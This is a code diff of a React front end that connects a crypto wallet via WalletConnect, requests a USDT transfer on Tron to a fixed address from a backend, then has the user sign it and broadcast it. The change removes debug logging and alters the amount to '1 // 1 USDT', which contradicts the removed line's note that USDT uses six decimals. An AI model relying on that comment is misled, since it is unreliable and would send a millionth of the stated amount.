@@ -1,14 +1,14 @@
-// App.js (React)
+
+// Updated Frontend (App.js)
 import React, { useState } from 'react';
 import { SignClient } from '@walletconnect/sign-client';
-import TronWeb from 'tronweb';
 import { Web3Modal } from '@web3modal/standalone';
-
 
 const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
 const modal = new Web3Modal({
   projectId: PROJECT_ID,
 });
+
 const App = () => {
   const [client, setClient] = useState(null);
   const [session, setSession] = useState(null);
@@ -34,11 +34,9 @@ const App = () => {
         },
       },
     });
-    console.log(uri);
-    alert(uri);
+
     if (uri) {
       modal.openModal({ uri });
-      // window.location.href = "trust://wc?uri=" +`${encodeURIComponent(uri)}`;
     }
 
     const _session = await approval();
@@ -56,13 +54,11 @@ const App = () => {
       body: JSON.stringify({
         from: account,
         to: "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB",
-        amount: 1000000 // 1 USDT = 1,000,000 (6 decimals)
+        amount: 1 // 1 USDT
       })
     });
 
     const tx = await res.json();
-    alert(tx);
-    console.log(tx);
     const signed = await client.request({
       topic: session.topic,
       chainId: "tron:0x2b6653dc",
@@ -71,7 +67,7 @@ const App = () => {
         params: [tx],
       },
     });
-    alert(signed);
+
     const broadcast = await fetch("https://smartcontbackend.onrender.com/broadcast", {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
